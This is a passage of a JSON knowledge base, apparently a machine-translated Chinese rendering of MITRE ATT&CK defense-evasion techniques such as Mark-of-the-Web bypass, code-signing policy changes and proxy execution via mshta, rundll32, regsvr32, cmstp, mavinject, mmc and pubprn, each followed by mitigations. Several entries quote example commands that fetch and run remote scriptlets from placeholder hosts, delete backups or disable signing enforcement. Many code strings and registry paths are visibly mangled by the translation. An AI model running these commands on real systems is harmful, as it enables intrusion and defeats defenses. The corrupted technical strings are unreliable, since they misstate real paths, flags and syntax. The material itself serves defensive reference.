              "content": "可以设置为1，以防止非，以防止-Administrator用户从其自己的HKCU证书存储中进行进一步的根安装。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "HTTP公共密钥固定（HPKP）是一种减轻潜在的中间人情况的方法，在这种情况下，对手使用错误发行或欺诈性证书来拦截加密通信，通过强制使用预期证书。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1553.005",
    "name": "Mark-of-the-Web Bypass",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Subvert Trust Controls",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用特定的文件格式，以颠覆WEB（MOTW）控件。在Windows中，当文件从Internet下载时，它们的标记为“隐藏的NTFS备用数据流”（ADS），名为"
        },
        {
          "type": "code",
          "content": " Zone.Idear.Identifier "
        },
        {
          "type": "text",
          "content": "，其特定值称为MOTW。用MOTW标记的文件受到保护，无法执行某些操作。例如，从MS Office 10开始，如果MS Office文件具有MOTW，它将在受保护的视图中打开。Windows Defender smartscreen将处理使用MOTW标记的可执行文件，该屏幕将文件与众所周知的可执行文件的允许列表进行比较。如果该文件未知/信任，SmartScreen将阻止执行，并警告用户不要运行该文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用集装箱文件，例如压缩/存档（.arj，.gzip）和/或磁盘图像（.ISO，.VHD）文件格式，以提供可能未使用MOTW标记的恶意有效载荷。从Internet下载的容器文件将用MOTW标记，但是在提取和/或安装容器文件后，内部的文件可能不会继承MOTW。MOTW是NTFS功能，许多容器文件不支持NTFS替代数据流。提取容器文件和/或安装后，其中包含的文件可以视为磁盘上的本地文件，并在没有保护的情况下运行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑禁用磁盘映像文件的自动安装（即.iso，.img，.vhd和.vhdx）。这可以通过修改与Windows Explorer文件关联相关的注册表值来实现这一目标，以便为这些文件扩展程序禁用自动Explorer“安装和燃烧”对话框。注意：这不会停用安装功能本身。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑在Web和/或电子邮件网关上阻止容器文件类型。考虑在Windows File Explorer中不注册容器文件扩展。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1553.006",
    "name": "Code Signing Policy Modification",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Subvert Trust Controls",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改代码签名策略，以实现无签名或自签名代码的执行。代码签名提供了开发人员的程序上的一定程度的真实性，并保证该程序尚未篡改。安全控制可以包括执行机制，以确保只能在操作系统上运行有效的签名代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认情况下，可以启用其中一些安全控件，例如MacOS上的Windows或系统完整性保护（SIP）上的驱动程序签名执行（DSE）。其他此类控件默认可以禁用，但可以通过应用程序控件进行配置，例如仅允许签名的动态链接库（DLL）在系统上执行。由于对于开发人员而言，在开发和测试应用程序期间修改默认签名执行策略可能是有用的，因此可以通过提高权限来实现这些功能的残疾。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过多种方式修改代码签名策略，包括通过使用命令行或GUI实用程序，修改注册表，以调试/恢复模式重新启动计算机，或通过更改内核内存中变量的值。可以修改系统的代码签名策略的命令示例包括"
        },
        {
          "type": "code",
          "content": " bcdedit.exe -set Testsigning在Windows上的"
        },
        {
          "type": "text",
          "content": "上的</code> "
        },
        {
          "type": "code",
          "content": " csrutil disable "
        },
        {
          "type": "text",
          "content": "在macOS上。根据实施，成功修改签名策略可能需要重新启动受损系统。此外，某些实现可以为用户引入可见伪像（例如：屏幕拐角处的水印，说该系统处于测试模式）。对手可能会试图去除此类文物。"
        }
      ],
      [
        {
          "type": "text",
          "content": "要访问内核内存以修改与签名检查有关的变量，例如修改"
        },
        {
          "type": "code",
          "content": " g_cioptions "
        },
        {
          "type": "text",
          "content": "以禁用驱动程序签名执行，对手可以使用签名且易于损坏的驱动程序进行利用以进行特权升级。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "使用安全引导可能会阻止某些修改实现来代码签名策略。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制本地管理员和域管理员帐户的使用，用于日常操作，可能使它们暴露于潜在的对手身上。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保为注册表设置适当的权限，以防止用户修改与代码签名策略相关的密钥。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.001",
    "name": "Compiled HTML File",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用汇编的HTML文件（.CHM）以隐藏恶意代码。CHM文件通常是Microsoft HTML帮助系统的一部分。CHM文件是各种内容的压缩汇编，例如HTML文档，图像和脚本/Web相关的编程语言，例如VBA，JScript，Java和ActiveX。CHM内容使用Internet Explorer浏览器的基础组件显示，该组件由HTML帮助执行程序（HH.EXE）加载。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以将包含嵌入式有效载荷的自定义CHM文件交付给受害者，然后由用户执行触发。CHM执行还可以绕过对不考虑通过HH.EXE执行二进制执行的旧系统和/或未召集的系统的应用程序控件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "如果给定系统或网络不需要，请考虑使用应用程序控制以防止执行HH.EXE，以防止对手的潜在滥用。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑阻止已知在对抗活动中使用的潜在不常见的文件类型的下载/传输和执行，例如CHM文件"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.002",
    "name": "Control Panel",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Control.exe来代理恶意有效载荷。Windows Control面板进程二进制（Control.exe）处理控制面板项目的执行，这是允许用户查看和调整计算机设置的实用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "控制面板项目是注册的可执行文件（.exe）或控制面板（.cpl）文件，后者实际上是导出"
        },
        {
          "type": "code",
          "content": " cplapplet "
        },
        {
          "type": "text",
          "content": "函数的Dynamic-Link库（.dll）文件。为了易于使用，控制面板项目通常包括在注册并加载到控制面板后可供用户使用的图形菜单。控制面板项目可以直接从命令行执行，通过应用程序编程接口（API）调用，也可以通过双击文件来编程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意控制面板项目可以通过网络钓鱼活动交付或作为多阶段恶意软件的一部分执行。控制面板项目，特别是CPL文件，也可能绕过应用程序和/或文件扩展名允许列表。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以用控制面板文件扩展名（.cpl）重命名恶意DLL文件（.dll），然后将其注册到"
        },
        {
          "type": "code",
          "content": " hkcu \\ software \\ Microsoft \\ Microsoft \\ Windows \\ Windows \\ CurrentVersion \\ Currenterver \\ Control \\ Control Panel \\ CPLS "
        },
        {
          "type": "text",
          "content": "。即使这些已注册的DLL不符合CPL文件规范，并且不导出"
        },
        {
          "type": "code",
          "content": " cplapplet "
        },
        {
          "type": "text",
          "content": "函数，在执行控制面板时，它们也会通过其"
        },
        {
          "type": "code",
          "content": " dllentrypoint "
        },
        {
          "type": "text",
          "content": "加载和执行。CPL文件不导出"
        },
        {
          "type": "code",
          "content": " CPLAPPLET "
        },
        {
          "type": "text",
          "content": "无法直接执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以在适当的情况下使用应用程序控制工具来识别并阻止潜在的恶意和未知的.CPL文件。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "将控制面板项目的存储和执行限制为受保护的目录，例如"
            },
            {
              "type": "code",
              "content": " c：\\ Windows "
            },
            {
              "type": "text",
              "content": "，而不是用户目录。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.003",
    "name": "CMSTP",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用CMSTP来代理恶意代码。Microsoft Connection Manager配置文件安装程序（CMSTP.EXE）是一个命令行程序，用于安装连接管理器服务配置文件。CMSTP.EXE接受安装信息文件（INF）作为参数，并安装用于远程访问连接的服务配置文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会向感染恶意命令感染的INF文件提供CMSTP.EXE。类似于regsvr32 /“ sopiveDoo”，CMSTP.EXE可能会被滥用以从远程服务器加载和执行DLL和 /或COM Scriptlets（SCT）。由于CMSTP.EXE是Microsoft可以签署的合法二进制文件，因此该执行还可以绕过Applocker和其他应用程序控制防御。"
        }
      ],
      [
        {
          "type": "text",
          "content": "CMSTP.EXE也可以滥用以绕过用户帐户控制，并通过自动提升的COM接口从恶意INF中执行任意命令。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "在给定环境中，CMSTP.EXE可能不需要（除非将其用于VPN连接安装）。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "如果给定系统或网络不需要，请考虑使用配置为阻止CMSTP.EXE执行的应用程序控制以防止对手的潜在滥用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.004",
    "name": "InstallUtil",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过可信赖的Windows实用程序使用Installutil来代理代码。InstallUtil是一种命令行实用程序，可以通过执行.NET二进制文件中指定的特定安装程序组件来安装和卸载资源。Microsoft也可以在Windows系统上的.NET目录中进行数字签名。：\\ Windows \\ Microsoft.net \\ Framework64 \\ V \\ installutil.exe </code>。"
        }
      ],
      [
        {
          "type": "text",
          "content": "installutil也可以通过使用二进制中的属性来绕过应用程序控制，该属性执行了用属性"
        },
        {
          "type": "code",
          "content": " [System.componentModel.runinstaller（true）]] "
        },
        {
          "type": "text",
          "content": ">的类装饰的类。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "在给定环境中可能不需要安装。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "如果给定系统或网络不需要，则使用配置的应用程序控制以阻止installutil.exe的执行，以防止对手的潜在滥用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.005",
    "name": "Mshta",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用MSHTA.EXE通过受信任的Windows实用程序来代理恶意执行.HTA文件和JavaScript或VBScript。有几个示例在初始折衷和执行代码期间利用mshta.exe的不同类型的威胁"
        }
      ],
      [
        {
          "type": "text",
          "content": "mshta.exe是执行Microsoft HTML应用程序（HTA）文件的实用程序。HTA是使用Internet Explorer的相同模型和技术执行的独立应用程序，但在浏览器之外。"
        }
      ],
      [
        {
          "type": "text",
          "content": "文件可以通过inline脚本由mshta.exe执行：<code> mshta vbscript：colles（execute（“ getObject（“”脚本：https [：] // https [：] // webererver/weberver/poradeload [。] sct [。] sct”））</代码>"
        }
      ],
      [
        {
          "type": "text",
          "content": "它们也可以直接从URL执行："
        },
        {
          "type": "code",
          "content": " mshta http [：] // weberver/pareload [。] hta "
        },
        {
          "type": "text",
          "content": ""
        }
      ],
      [
        {
          "type": "text",
          "content": "MSHTA.EXE可用于绕过无法解释其潜在用途的应用程序控制解决方案。由于MSHTA.EXE在Internet Explorer的安全性上下文之外执行执行，因此它还绕过浏览器安全设置。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "MSHTA.EXE在给定环境中可能不需要，因为其功能与已达到生命的旧版本的旧版本相关。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "如果给定系统或网络不需要"
            },
            {
              "type": "code",
              "content": " mshta.exe "
            },
            {
              "type": "text",
              "content": "，则使用配置为阻止执行"
            },
            {
              "type": "code",
              "content": " mshta.exe "
            },
            {
              "type": "text",
              "content": "，以防止对手的潜在滥用。例如，在Windows 10和Windows Server 2016及更高版本中，Windows Defender应用程序控制（WDAC）策略规则可应用以阻止"
            },
            {
              "type": "code",
              "content": " mshta.exe </code "
            },
            {
              "type": "text",
              "content": "应用程序并防止滥用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.007",
    "name": "Msiexec",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用MSIEXEC.EXE来代理恶意有效载荷。msiexec.exe是Windows安装程序的命令行实用程序，因此通常与执行安装软件包（.msi）相关联。MSIEXEC.EXE二进制文件也可以由Microsoft数字签名。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用msiexec.exe来启动本地或网络访问的MSI文件。MSIEXEC.EXE也可以执行DLL。由于它可以在Windows系统上签名和本机，因此MSIEXEC.EXE可用于绕过无法解释其潜在滥用的应用程序控制解决方案。如果启用了"
        },
        {
          "type": "code",
          "content": " effect> exply> plocy "
        },
        {
          "type": "text",
          "content": "策略，则MSIEXEC.EXE执行也可以将其提升到系统特权。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑禁用"
            },
            {
              "type": "code",
              "content": "始终列出"
            },
            {
              "type": "text",
              "content": "策略，以防止Windows安装程序软件包的执行升高。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将MSIEXEC.EXE的执行限制为特权帐户或需要使用它来减少恶意使用机会的团体。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.008",
    "name": "Odbcconf",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用ODBCCONF.EXE来代理恶意有效载荷。ODBCCONF.EXE是一个Windows实用程序，允许您配置开放数据库连接（ODBC）驱动程序和数据源名称。ODBCCONF.EXE二进制可以由Microsoft数字签名。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用odbcconf.exe绕过无法解释其潜在滥用的应用程序控制解决方案。与Regsvr32相似，ODBCCONF.EXE具有"
        },
        {
          "type": "code",
          "content": " regsvr < /code>标志，可以滥用执行DLL（ex： odbcconf.exe /s /s /a {regsvr“ c：\\ users \\ users \\ public \\ public \\ file。dll“} "
        },
        {
          "type": "text",
          "content": "）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "ODBCCONF.EXE在给定环境中可能不需要。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "如果给定系统或网络不需要，则使用配置的应用程序控制以阻止ODBCCONF.EXE的执行，以防止对手的潜在滥用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.009",
    "name": "Regsvcs/Regasm",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Regsvcs和Regasm通过受信任的Windows实用程序来代理代码。regsvcs和regasm是用于注册.NET组件对象模型（COM）组件的Windows命令行实用程序。两者都是Microsoft可以数字签名的二进制文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这两种实用程序均可通过使用二进制中的属性来绕过应用程序控制，以指定在注册或未注册之前运行的代码："
        },
        {
          "type": "code",
          "content": " [comregisterFunction] "
        },
        {
          "type": "text",
          "content": "或<code> [comunregisterfunction> comunregisterfunction>]。即使该过程在特权不足且未能执行的情况下运行，即使该过程运行，也将执行具有注册和未注册属性的代码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "在给定环境中，RegsVC和Remasm可能不需要。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "阻止regsvcs.exe和regasm.exe的执行，如果给定系统或网络不需要它们以防止对手的潜在滥用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.010",
    "name": "Regsvr32",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用regsvr32.exe来代理恶意代码。regsvr32.exe是一个命令行程序，用于注册和注册对象链接和嵌入控件，包括动态链接库（DLL），在Windows系统上。REGSVR32.EXE二进制也可以由Microsoft签署。"
        }
      ],
      [
        {
          "type": "text",
          "content": "regsvr32.exe的恶意使用可能会避免触发可能无法监视由Regsvr32.exe进程执行的安全工具，并且由于使用REGSVR32.EXE从Windows上使用Regsvr32.exe进程，而regsvr32.exe进程是正常操作的。REGSVR32.EXE也可以用于专门绕过使用功能的应用程序控制，以加载COM Scriptlets在用户权限下执行DLL。由于REGSVR32.EXE是网络和代理意识到的，因此可以通过将统一资源定位器（URL）加载到外部Web服务器上作为调用期间的参数来加载脚本。此方法没有对注册表进行任何更改，因为实际上没有执行COM对象，而是执行。该技术的这种差异通常被称为“明确的事”，并已用于针对政府的竞选活动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "REGSVR32.EXE也可以利用来注册用于通过组件对象模型劫持来建立持久性的COM对象。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1050",
        "name": "利用保护",
        "description": [
          [
            {
              "type": "text",
              "content": "微软的增强缓解体验工具包（EMET）攻击表面降低（ASR）功能可用于阻止Regsvr32.EXE绕过应用程序控制。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以通过Regsvr32功能识别并阻止潜在的恶意软件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.011",
    "name": "Rundll32",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用rundll32.exe来代理恶意代码。使用rundll32.exe，直接执行VICE（即共享模块），可能会避免触发可能无法监视rundll32.exe进程执行的安全工具，因为允许清单或正常操作中的误报。rundll32.exe通常与执行dll有效载荷（ex："
        },
        {
          "type": "code",
          "content": " rundll32.exe {dllName，dllFunction} "
        },
        {
          "type": "text",
          "content": "）关联。"
        }
      ],
      [
        {
          "type": "text",
          "content": "rundll32.EXE还可以使用无证件的shell32.dll functions "
        },
        {
          "type": "code",
          "content": " control_rundll "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " control> control_rundllasuser "
        },
        {
          "type": "text",
          "content": "来执行控制面板项目文件（.cpl）。双击一个.cpl文件还会导致rundll32.exe执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Rundll32也可以用于执行诸如JavaScript之类的脚本。可以使用类似的语法来完成此操作："
        },
        {
          "type": "code",
          "content": " rundll32.exe javascript：“ .. \\ mshtml，runhtmlapplication”; document.write（）; getObject（）[。] com/alicial.sct”）” "
        },
        {
          "type": "text",
          "content": "这种行为已被诸如Poweliks之类的恶意软件所使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以通过滥用Rundll32.EXE加载DLL函数名称的方式来试图从分析中掩盖恶意代码。作为Windows兼容性支持各种字符集的一部分，Rundll32.exe将在加载指定功能之前首先检查宽/unicode，然后检查ANSI字符支持的函数（例如，给定命令"
        },
        {
          "type": "code",
          "content": " rundll32.exe extpledll.dll，examplefunction，examplefunction "
        },
        {
          "type": "text",
          "content": "，rundll32.exe将首先尝试执行"
        },
        {
          "type": "code",
          "content": " examplefunctionw "
        },
        {
          "type": "text",
          "content": "，或在加载"
        },
        {
          "type": "code",
          "content": " examplefunctiona "
        },
        {
          "type": "text",
          "content": "之前失败，然后再加载"
        },
        {
          "type": "code",
          "content": " examplefunction "
        },
        {
          "type": "text",
          "content": "）。因此，对手可以通过创建多个相同的导出函数名称和附加"
        },
        {
          "type": "code",
          "content": " w "
        },
        {
          "type": "text",
          "content": "和/或"
        },
        {
          "type": "code",
          "content": " a "
        },
        {
          "type": "text",
          "content": "附加到无害的函数来掩盖恶意代码。DLL函数也可以由序数字导出和执行（例如："
        },
        {
          "type": "code",
          "content": " rundll32.exe file.dll，＃1 "
        },
        {
          "type": "text",
          "content": "）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此外，对手可以使用伪装技术（例如更改DLL文件名，文件扩展名或功能名称）来进一步隐藏恶意有效载荷的执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1050",
        "name": "利用保护",
        "description": [
          [
            {
              "type": "text",
              "content": "微软增强的缓解体验工具包（EMET）攻击表面降低（ASR）功能可用于阻止使用Rundll32.EXE绕过应用程序控制的方法。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.012",
    "name": "Verclsid",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用verclsid.exe来代理恶意代码。VERCLSID.EXE被称为扩展CLSID验证主机，负责在Windows Explorer或Windows Shell使用Windows Expliser或Windows Shell使用之前验证它们。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用verclsid.exe执行恶意有效载荷。这可以通过运行<code> verclsid.exe /s /c {clSID} < /code>来实现，其中文件由类ID（CLSID）引用，这是一个用于识别COM对象的唯一标识号。verclsid.exe执行的com有效载荷可能能够执行各种恶意操作，例如从远程服务器（类似于regsvr32）加载和执行com scriptlets（sct）。由于二进制文件可以在Windows系统上签名和/或本机，因此通过Verclsid.exe执行执行。EXE可以绕过无法解释其潜在滥用的应用程序控制解决方案。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果在给定环境中不需要，请考虑删除verclsid.exe。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "如果给定系统或网络不需要为了防止对手的潜在滥用，则使用该应用程序配置为阻止verclsid.exe的执行。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑修改主机防火墙规则，以防止verclsid.exe的出口流量。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.013",
    "name": "Mavinject",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Mavinject.exe执行恶意代码。mavinject.exe是Microsoft应用程序虚拟化喷油器，它可以作为Microsoft Application虚拟化（APP-V）的一部分将代码注入外部进程中的Windows实用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用mavinject.exe将恶意dll注入运行过程（即动态链接库注入），允许任意代码执行（例如<code> c：\\ windows \\ windows \\ system32 \\ mavinject.exe pid /imptrunning pid /indectRunning path_dll < /code < /code < /code < /code>）。由于microsoft可以通过该方法代理执行可能会通过安全产品逃避检测，因为Microsoft可以将MAVINJEDTE.EXE数字签名，因为在合法过程中执行被掩盖。"
        }
      ],
      [
        {
          "type": "text",
          "content": "除了动态链接库注入外，Mavinject.exe还可以滥用通过其"
        },
        {
          "type": "code",
          "content": "/hmodule "
        },
        {
          "type": "text",
          "content": " command-line参数执行导入描述符注入（例如"
        },
        {
          "type": "code",
          "content": " mavinjectpath_dll ordinal_number "
        },
        {
          "type": "text",
          "content": "）。此命令将在给定的基础地址将由指定DLL组成的导入表条目注入模块中。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果在给定的环境中未使用Microsoft App-V，请考虑删除mavinject.exe。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "如果给定系统或网络不需要为了防止对手的潜在滥用，则使用配置为阻止Mavinject.exe执行的应用程序控件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1218.014",
    "name": "MMC",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Binary Proxy Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用MMC.EXE来执行恶意.MSC文件。Microsoft Management Console（MMC）是Microsoft可以签名的二进制文件，并在其GUI或命令提示符中以多种方式使用。MMC可用于创建，打开和保存包含由Microsoft创建的管理工具的自定义游戏机，称为Snap-ins。这些快照可用于本地或远程管理Windows系统。MMC也可以用于打开Microsoft创建的.MSC文件以管理系统配置。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，"
        },
        {
          "type": "code",
          "content": " MMC C：\\ Users \\ foo \\ admintools.msc /a < /code>将在作者模式下打开自定义的，保存的控制台MSC文件。另一个常见的示例是 mmc gpedit.msc "
        },
        {
          "type": "text",
          "content": "，它将打开“组策略编辑器应用程序”窗口。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用MMC命令执行恶意任务。例如，"
        },
        {
          "type": "code",
          "content": " MMC WBADMIN.MSC删除目录-Quiet "
        },
        {
          "type": "text",
          "content": "删除系统上的备份目录（即抑制系统恢复），而无需向用户提示仅在Windows Server操作系统上默认存在）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可能滥用MMC执行恶意.MSC文件。例如，对手可以首先创建恶意注册表标识符（CLSID）子键，该标识符（CLSID）subkey独特地标识了组件对象模型类对象。然后，对手可以使用链接到恶意CLSID子钥匙的“链接到Web地址”的“链接到Web地址”。保存.MSC文件后，对手可以使用以下命令调用恶意CLSID有效负载："
        },
        {
          "type": "code",
          "content": " mmc.exe -embedding c：\\ path \\ to \\ test.msc "
        },
        {
          "type": "text",
          "content": "。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "在给定环境中，MMC可能不需要，因为系统管理员（而不是普通用户或客户端）主要使用它。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "如果给定系统或网络不需要，则使用配置的应用程序控制以阻止MMC的执行，以防止对手的潜在滥用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1216.001",
    "name": "PubPrn",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "System Script Proxy Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用PubPRN来代理恶意远程文件。pubprn.vbs是一个视觉基本脚本，它发布了Active Directory域服务的打印机。该脚本可以由Microsoft签名，通常通过"
        },
        {
          "type": "code",
          "content": " cscript.exe "
        },
        {
          "type": "text",
          "content": "通过Windows Command Shell执行。例如，以下代码在指定域中发布打印机："
        },
        {
          "type": "code",
          "content": " cscript pubprn打印机1 ldap：// cn = container1，dc = domain1，dc = com "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用PubPrn执行在远程站点上托管的恶意有效载荷。为此，对手可以设置第二个"
        },
        {
          "type": "code",
          "content": "脚本："
        },
        {
          "type": "text",
          "content": "参数来引用托管在远程站点上的scriptlet文件（.sct）。示例命令是"
        },
        {
          "type": "code",
          "content": " pubprn.vbs 127.0.0.1脚本：https：//mydomain.com/folder/file.sct "
        },
        {
          "type": "text",
          "content": "。此行为可以绕过签名验证限制和应用程序控制解决方案，这些解决方案不会解释此脚本的滥用。"
        }
      ],
      [
        {
          "type": "text",
